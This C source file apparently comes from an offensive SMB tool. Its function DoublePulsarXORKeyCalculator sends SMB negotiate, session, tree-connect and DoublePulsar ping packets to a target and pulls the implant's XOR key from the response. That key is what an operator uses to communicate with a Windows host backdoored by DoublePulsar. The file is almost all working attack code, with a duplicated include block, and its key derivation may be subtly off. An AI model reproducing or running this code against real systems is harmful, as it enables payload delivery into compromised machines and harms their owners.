#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int smb_send_all(SOCKET socket_handle, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        int result = send(socket_handle, (const char *)data + sent, chunk, 0);

        if (result == SOCKET_ERROR || result == 0)
            return -1;

        sent += (size_t)result;
    }

    return 0;
}

static int smb_receive_exact(SOCKET socket_handle, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int chunk = remaining > INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(socket_handle, (char *)buffer + received, chunk, 0);

        if (result == SOCKET_ERROR || result == 0)
            return -1;

        received += (size_t)result;
    }

    return 0;
}

static int smb_receive_frame(SOCKET socket_handle, uint8_t *buffer,
                             size_t capacity, size_t *frame_length)
{
    size_t payload_length;

    if (capacity < 4 || smb_receive_exact(socket_handle, buffer, 4) != 0)
        return -1;

    payload_length = ((size_t)buffer[1] << 16) |
                     ((size_t)buffer[2] << 8) |
                     (size_t)buffer[3];

    if (payload_length > capacity - 4)
        return -1;

    if (smb_receive_exact(socket_handle, buffer + 4, payload_length) != 0)
        return -1;

    *frame_length = payload_length + 4;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET socket_handle = INVALID_SOCKET;
    uint8_t *negotiate_packet = NULL;
    uint8_t *session_setup_packet = NULL;
    uint8_t *tree_connect_packet = NULL;
    uint8_t *ping_packet = NULL;
    uint8_t response[65536];
    size_t response_length;
    size_t negotiate_length = sizeof(SMB_NEGOTIATE_PKT) - 1;
    size_t session_setup_length = sizeof(SMB_SESSION_SETUP_PKT) - 1;
    size_t tree_connect_length = sizeof(SMB_TREE_CONNECT_PKT) - 1;
    size_t ping_length = sizeof(DP_PING_PKT) - 1;
    uint8_t user_id[2];
    uint8_t tree_id[2];
    uint32_t key = 0;

    if (ip == NULL || port < 1 || port > 65535)
        return 0;

    negotiate_packet = (uint8_t *)malloc(negotiate_length);
    session_setup_packet = (uint8_t *)malloc(session_setup_length);
    tree_connect_packet = (uint8_t *)malloc(tree_connect_length);
    ping_packet = (uint8_t *)malloc(ping_length);

    if (negotiate_packet == NULL || session_setup_packet == NULL ||
        tree_connect_packet == NULL || ping_packet == NULL)
        goto cleanup;

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, negotiate_length);
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, session_setup_length);
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, tree_connect_length);
    memcpy(ping_packet, DP_PING_PKT, ping_length);

    socket_handle = smb_connect(ip, port);
    if (socket_handle == INVALID_SOCKET)
        goto cleanup;

    if (smb_send_all(socket_handle, negotiate_packet, negotiate_length) != 0 ||
        smb_receive_frame(socket_handle, response, sizeof(response),
                          &response_length) != 0)
        goto cleanup;

    if (smb_send_all(socket_handle, session_setup_packet,
                     session_setup_length) != 0 ||
        smb_receive_frame(socket_handle, response, sizeof(response),
                          &response_length) != 0 ||
        response_length < 34)
        goto cleanup;

    user_id[0] = response[32];
    user_id[1] = response[33];
    tree_connect_packet[32] = user_id[0];
    tree_connect_packet[33] = user_id[1];

    if (smb_send_all(socket_handle, tree_connect_packet, tree_connect_length) != 0 ||
        smb_receive_frame(socket_handle, response, sizeof(response),
                          &response_length) != 0 ||
        response_length < 34)
        goto cleanup;

    tree_id[0] = response[28];
    tree_id[1] = response[29];
    user_id[0] = response[32];
    user_id[1] = response[33];

    ping_packet[28] = tree_id[0];
    ping_packet[29] = tree_id[1];
    ping_packet[32] = user_id[0];
    ping_packet[33] = user_id[1];

    if (smb_send_all(socket_handle, ping_packet, ping_length) != 0 ||
        smb_receive_frame(socket_handle, response, sizeof(response),
                          &response_length) != 0)
        goto cleanup;

    if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START + 3 ||
        SMB_RESP_SIGNATURE_END >= response_length ||
        SMB_RESP_SIGNATURE_START + 3 >= response_length)
        goto cleanup;

    key = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    if (socket_handle != INVALID_SOCKET)
        closesocket(socket_handle);

    free(negotiate_packet);
    free(session_setup_packet);
    free(tree_connect_packet);
    free(ping_packet);

    return (unsigned int)key;
}